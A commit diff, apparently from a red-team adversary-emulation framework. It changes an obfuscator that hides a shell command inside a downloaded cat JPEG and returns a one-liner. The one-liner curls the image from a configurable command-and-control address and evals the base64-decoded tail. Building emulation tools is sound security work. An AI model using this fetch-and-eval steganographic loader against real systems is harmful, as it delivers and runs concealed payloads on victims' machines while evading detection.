applying stenography obfuscator to list of options

+++ app/obfuscators/stenography.py
@@ -1,3 +1,5 @@
+from os import path
+
 import requests
 import urllib3
 
@@ -17,12 +19,12 @@ class Obfuscation(BaseObfuscator):
 
     """ EXECUTORS """
 
-    @staticmethod
-    def sh(link):
-        response = requests.get('https://aws.random.cat/meow', verify=False)
-        data = response.json()
-        with open('data/payloads/meow-%s.jpg' % link.id, 'wb') as meow:
-            meow.write(requests.get(data['file'], verify=False).content)
-            meow.write(str.encode(link.command))
-        return 'curl -s -X POST -H "file:meow-%s.jpg" localhost:8888/file/download > meow-%s.jpg;eval $(tail -c %s meow-%s.jpg | base64 --decode)' \
-               % (link.id, link.id, len(link.command), link.id)
+    def sh(self, link):
+        if not path.isfile('data/payloads/meow-%s.jpg' % link.id):
+            response = requests.get('https://aws.random.cat/meow', verify=False)
+            data = response.json()
+            with open('data/payloads/meow-%s.jpg' % link.id, 'wb') as meow:
+                meow.write(requests.get(data['file'], verify=False).content)
+                meow.write(str.encode(link.command))
+        return 'curl -s -X POST -H "file:meow-%s.jpg" %s/file/download > meow-%s.jpg;eval $(tail -c %s meow-%s.jpg | base64 --decode)' \
+               % (link.id, self.get_config(prop='app.contact.http'), link.id, len(link.command), link.id)
